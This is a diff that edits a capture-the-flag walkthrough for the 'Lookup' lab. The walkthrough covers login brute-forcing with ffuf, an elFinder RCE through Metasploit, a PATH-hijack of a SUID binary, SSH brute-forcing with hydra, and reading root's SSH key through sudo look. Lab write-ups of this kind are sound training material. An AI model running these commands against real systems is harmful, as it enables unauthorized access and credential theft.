@@ -1,41 +1,40 @@
-So My attempt is to whenever I get the IP I always hit the IP in the browser after all basic stuff that I already mentioned in Instruction.txt file.
+My approach is to always hit the IP in the browser after the basic setup already mentioned in the Instruction.txt file.
 
-But doing so leads a redirect to http://lookup.thm.
+Doing so leads to a redirect to http://lookup.thm.
 
 So we need to do a small tweak in the file */etc/hosts*
 
-Then where you entered the ip at the end of that ip put a single space then lookup.thm and save & exit.That's It.
+At the end of the IP entry, add a single space followed by `lookup.thm`, then save and exit.
 
-Then i opened http://ip and it redirected me to http://lookup.thm then i saw a login page.
+Opening `http://ip` redirected to http://lookup.thm, where a login page appeared.
 
-But i tried to do *Directory Enumuration* so i found directories are
+Running *Directory Enumeration* revealed:
 
 ```
 200 -    1B  - /login.php
 ```
 
-That's it i got.
-so the page http://lookup.thm/login.php was a login page.
+That's all I found. The page http://lookup.thm/login.php is the login page.
 
-<login_page>
+![Login Page](login_page.png)
 
-When viewing its source code:-
+Viewing the source code:
 
-<source_code>
+![Source Code](Source_code.png)
 
-We can see the username and password parameter in the source code clearly.
-Using this parameter We will hit a curl req with below command to test for valid req.
+The `username` and `password` parameters are clearly visible in the source code.
+Using these parameters, we can craft a curl request to test credentials:
 
 ```
-curl -v -X POST http://lookup.thm/login.thm -d "username=orion&password=1234"
+curl -v -X POST http://lookup.thm/login.php -d "username=orion&password=1234"
 ```
 ```
 Wrong username or password. Please try again.
 Redirecting in 3 seconds.
 ```
-The Req header in the curl were 
+The request headers were:
 ```
-> POST /login.thm HTTP/1.1
+> POST /login.php HTTP/1.1
 > Host: lookup.thm
 > User-Agent: curl/8.18.0
 > Accept: */*
@@ -44,21 +43,21 @@ The Req header in the curl were
 
 ```
 
-And it was working it gave me the real wrong credentials error that i got in browser manual login too.
+It worked — giving us the same "wrong credentials" error seen in the browser.
 
-That means we can do req to login.thm in this way.
+This confirms we can submit login requests this way.
 
-But without jumping to password bruteforcing i tried for sqli and it was not working.
+Before jumping to password brute-forcing, I tested for SQL injection, but it wasn't working.
 
-Now finally that we are waiting for..
+Now for what we've been waiting for...
 
-# Bruteforcing Login Page - Part - 1
+# Brute-Forcing the Login Page — Part 1
 
- For this we are going to use ffuf.
- So we will do the below command to do enumuration to login page.
- But Before doing so we need to manually send 1 req first to get the response size and number of words in a invalid response.
+For this we are going to use ffuf.
+We will run the command below to enumerate the login page.
+But before doing so, we need to manually send one request first to get the response size and word count of an invalid response.
 
-so as according to curl output i did 
+Based on the curl output, we run:
 ```
 ffuf -u http://lookup.thm/login.php \
 -w <(echo "random_user"):USER \
@@ -67,7 +66,7 @@ ffuf -u http://lookup.thm/login.php \
 -d "username=USER&password=PASS" \
 ```
 
-Now what i got as output was
+The output was:
 
 ``` 
 [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 64ms]
@@ -75,9 +74,9 @@ Now what i got as output was
     * USER: random_user
 ```
 
-<ffuf_image>
+![ffuf baseline test](ffuf_image.png)
 
-**so as according to curl output and Now we know that invalid response have response size 74 and response words 10**
+**Based on the curl output, we now know that an invalid response has a size of 74 and 10 words.**
 ```
 ffuf -v  -u http://lookup.thm/login.php \
 -w /home/Seclists/Usernames/top-usernames-shortlist.txt:USER \
@@ -88,14 +87,14 @@ ffuf -v  -u http://lookup.thm/login.php \
 -fs 74 -fw 10 
 ```
 
-Now we can see for admin the response was differ. So we tried with admin username in browser and the error was 
+The response for `admin` differs from the others. Trying `admin` in the browser gives:
 
 ``` 
 Wrong password. Please try again.
 Redirecting in 3 seconds. 
 ```
-See the error that we got from the curl at very top and the error that we are getting now has a difference that the error that we got now tells us that username is correct.
-Meaning we have found 1 valid user. We will now user another wordlist.
+Notice the difference from the earlier curl error — this one indicates the username is valid.
+We've found a valid username. Now we'll use a different wordlist for further enumeration.
 
 ```
 ffuf -v  -u http://lookup.thm/login.php \
@@ -106,7 +105,7 @@ ffuf -v  -u http://lookup.thm/login.php \
 -H "Content-Type: application/x-www-form-urlencoded" \
 -fs 74 -fw 10
 ```
-As you run it you will find another user.
+Running this, you'll find another user.
 ```
 [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 75ms]
 | URL | http://lookup.thm/login.php
@@ -119,9 +118,9 @@ As you run it you will find another user.
     * USER: jose
 ```
 
-So now we have a valid another username jose. 
+We now have another valid username: `jose`.
 
-now we will ffuf for same user but for passwords only for the username jose.
+Now we'll run ffuf for the `jose` user, targeting passwords only.
 ```
 ffuf -v  -u http://lookup.thm/login.php \
 -w /home/Seclists/Passwords/Common-Credentials/best1050.txt:PASS \
@@ -130,114 +129,119 @@ ffuf -v  -u http://lookup.thm/login.php \
 -H "Content-Type: application/x-www-form-urlencoded" \
 -fs 62 -fw 8
 ```
-Now you will get the password. Login there with credentials in the web.
+You'll get the password. Log in using these credentials.
 
-You will now land us to http://files.lookup.thm/ but this is not in out /etc/hosts files so we add it too into out hosts file with the command
+You will be redirected to http://files.lookup.thm/, which is not in our `/etc/hosts` file, so add it there as well.
 
-now after adding do enter credentials again and you land at the page http://files.lookup.thm/elFinder/elfinder.html#elf_l1_Lw.
-Here you can see each file open and see it. after a lot of enumuration i was able to find the version of elfinder(The web file-manager that is being used here.)
+After adding it, enter the credentials again and you'll land at http://files.lookup.thm/elFinder/elfinder.html#elf_l1_Lw.
+Here you can browse and open files. After some enumeration, I was able to find the version of elFinder (the web file manager being used here).
 
-And its version was vulnerable to rce. i got it after searching for that elfinder version number. so i used msfconsole to do this task.
-to get the exploit just use the preinstalled kali tool searchsploit. by  the command searchsploit -c "elfinder with version number"
-after getting the exploit.
-Do start msfconsole by typing it into the terminal and when it starts do run "search <elfinder with version number>" then you will get a exploit path. Use the 4th one or one with excellent rating and path starts with /unix/webapp......... 
+The version was vulnerable to RCE. I confirmed this after searching for that elFinder version number, then used msfconsole to exploit it.
+To find the exploit, use the pre-installed Kali tool `searchsploit` with the command `searchsploit elfinder <version_number>`.
+After identifying the exploit, start msfconsole and run `search elfinder <version_number>`. You'll get an exploit path — use the one with an **Excellent** rating whose path starts with `/unix/webapp/`.
 
-Then do "use <exploit_path>"
-set the rhosts to files.lookup.thm by the command set RHOSTS files.lookup.thm
-set the lhost to tun0 by the command set LHOST tun0
-then enter the command run and hit enter. The exploit runs.
-But i got the error.
+Then run `use <exploit_path>`,
+set the target host with `set RHOSTS files.lookup.thm`,
+set the local host with `set LHOST tun0`,
+then run `run`. However, an error appeared:
 
-<msf_error>
+![Metasploit error](msf_error.png)
 
-so to resolving steps were : -
-Set the rhosts to room_ip by the command set RHOSTS <room_ip>
-Next set the vhost to files.lookup.thm by the command set VHOST files.lookup.thm
-and now hit the run you will get the Meterpreter session.
-Meterpreter session is also similar to shell but we enter shell and get the shell.
-We ran few command that we all ran when we get the shell. Command are whoami,id,
-Now this shell is not full tty shell to make it fully tty shell we will use the below command to be comforable with shell
+The fix is:
+Set RHOSTS to the room IP: `set RHOSTS <room_ip>`
+Then set the virtual host: `set VHOST files.lookup.thm`
+Now run the exploit — you'll get a Meterpreter session.
+A Meterpreter session is similar to a shell; drop into a proper shell from there.
+Run the usual recon commands: `whoami`, `id`, etc.
+This shell is not a full TTY. To upgrade it, run:
 ```
 python3 -c "import pty; pty.spawn('/bin/bash')"
 ```
-This will give us a fully tty bash shell.
+This will give us a fully interactive bash shell.
+
 # Privilege Escalation — Part 2
- Now we will start the hunt for current users in this system.
 
- As we all know this truth about the file /etc/passwd :-- The /etc/passwd file is a text database of user accounts on a Linux/Unix system.
+We'll start by enumerating users on the system.
 
-When we did cat /etc/passwd. i got 
+The `/etc/passwd` file is a text database of user accounts on a Linux/Unix system.
 
-<users_image>
+Running `cat /etc/passwd` gives:
 
-all entries follows this structure **username:password_placeholder:UID:GID:comment:home_directory:shell**
-In the result we can see all system users except 2 *root* and *think*.
-Now we have another user think whose uid & gid are 1000. It has also its home directory at /home/think lets gets in and see whats there.
+![/etc/passwd output](users_image.png)
 
-<Enter_think>
+Each entry follows this structure: **username:password_placeholder:UID:GID:comment:home_directory:shell**
+In the output, we can see all system users. Two notable ones are *root* and *think*.
+The user `think` has UID & GID 1000 with a home directory at `/home/think`. Let's explore it.
 
-see there is user.txt but we are currently logged in as www-data and that is owned by root and group think. so we can't read it for now.
-But when we saw the hidden files with la  -a flag we can see there is a .password file under /home/think/.
+![Entering think's home directory](Enter_think.png)
 
-<Password_think>
+There's a `user.txt` file, but since we're logged in as `www-data` and it's owned by root/think, we can't read it yet.
+However, listing hidden files with `ls -a` reveals a `.passwords` file under `/home/think/`.
 
-Next we will search for SUID binaries as they can gave us root access.
+![Password file discovery](Password_think.png)
 
-<SUID_binary>
-We can see a unusual binary named /usr/sbin/pwm
-When we execute this binary so it is trying to execute id and get the username out of it, if we could trick it to think that we are the user think we can see the content of /home/think/.passwords.
+Next, we'll search for SUID binaries that could grant root access.
 
-<Execute Binary>
+![SUID binaries](SUID_binary.png)
 
-If we are lucky enough that the binary is executing the command id without using the full path, we can add a modified script has the same name and append it’s path to the path variable. Lets try that
-To do This we will make a file at the location  /tmp with filename id
-To do so we need to first exit from shell and go the meterpreter session since meterpreter session doesn't have a option to create file.
-So The current directory in which we opnened the msfconsole. we will create the id file there. the content within id files will be
+There's an unusual binary at `/usr/sbin/pwm`.
+When executed, this binary runs the `id` command and uses the username from its output. If we trick it into thinking we're the user `think`, we can read `/home/think/.passwords`.
 
+![Executing the pwm binary](Execute_binary.png)
+
+If the binary calls `id` without a full path, we can create a fake `id` script and prepend its location to `$PATH`. Let's try that.
+We'll create a file named `id` at `/tmp`.
+To do this, exit the shell and go back to the Meterpreter session, since it doesn't support direct file creation in the shell. Create the `id` file in the directory where you opened msfconsole. The content of the `id` file should be:
+
+```
 #!/bin/bash
 echo "uid=1001(think) gid=1001(think) groups=1001(think)"
-
-then we save it on our local disk and upload it with the meterpreter command **upload id**
-
-<Make_script>
-
-Since Chmod is supported by meterpreter we will gave this id file executable permission.
-Now make sure you are inside the tmp directory. Cuz we are going to executing a command that will add the current directory to the varible $PATH.
-if you followed by steps and switched from meterpreter to shell i am pretty sure you are at the directory /var/www/files.lookup.thm/public_html/elFinder/php. switch to /tmp
-
-The command is **PATH=/tmp:$PATH**
-To make sure your Your path command succeed or not. Run echo $PATH if you get /tmp: at the beginning of the line your command is successfully executed.
-
-Now Run that *SUID binary*
-You should get a wordlist copy and save the wordlist for bruteforcing.
-If you don't got the wordlist repeat the steps.
-
-Now we are going to bruteforce the user think with the wordlist by the command 
 ```
- hydra -l think -P /path/to/wordlist  -t 4 ssh://room_ip
+
+Save it locally and upload it using the Meterpreter command **`upload id`**.
+
+![Uploading the script](Make_script.png)
+
+Since `chmod` is supported by Meterpreter, make the `id` file executable.
+Make sure you're inside the `/tmp` directory, as we're about to prepend it to the `$PATH` variable.
+If you followed the steps and switched from Meterpreter to shell, you're likely at `/var/www/files.lookup.thm/public_html/elFinder/php`. Switch to `/tmp`.
+
+The command is **`PATH=/tmp:$PATH`**
+To verify, run `echo $PATH`. If it starts with `/tmp:`, the command was successful.
+
+Now run the *SUID binary*.
+You should get a wordlist. Copy and save it for brute-forcing.
+If you don't get the wordlist, repeat the steps.
+
+Now brute-force the `think` user's SSH credentials with:
 ```
-After running you will get the ssh pass login using the ssh pass
+hydra -l think -P /path/to/wordlist -t 4 ssh://room_ip
+```
+After running, you'll get the SSH password. Log in with:
 
-<ssh_login>
+![SSH login](ssh_login.png)
 
-Do enumuration there and you will got user flag.
+Enumerate the system and you'll find the user flag.
 
-# SUDO privilage - Part-3
+# Sudo Privilege Escalation — Part 3
 
-Checking the sudo privileges for the think user by the command *sudo -l*, we can see that we are able to run the look binary as root.
+Checking sudo privileges with `sudo -l`, we can see that the `think` user can run the `look` binary as root.
 
-<look_binary>
+![look binary sudo privilege](Look_binary.png)
 
-The look binary is similar to grep in that its primary purpose is to search for lines in a file that begin with a specified string. If it finds any lines that start with the given string, it prints them.
+The `look` binary is similar to `grep` in that its primary purpose is to search for lines in a file that begin with a specified string. If it finds any lines starting with the given string, it prints them.
 
 We can leverage this behavior to read arbitrary files by specifying an empty string as the search term. Since every line begins with an empty string, all lines in the file will match, causing the entire file to be printed. This technique is also documented on GTFOBins.
 
-Using this method, we can successfully read the private SSH key of the root user as follows:
+Using this method, we can read the private SSH key of the root user:
 
-<key_>
+![Reading root's SSH key](key_.png)
 
-After getting the key save the key as filename key and gave him chmod 600 permission by the command **chmod 600 key**
+After getting the key, save it as `key` and set the correct permissions with **`chmod 600 key`**.
 
-Now login as root by the command ssh -i <filename of key> root@<ip>
+Log in as root with:
+```
+ssh -i key root@<ip>
+```
 
-Now enumurate there and you will get the root flag too.
+Enumerate the system and you'll find the root flag.
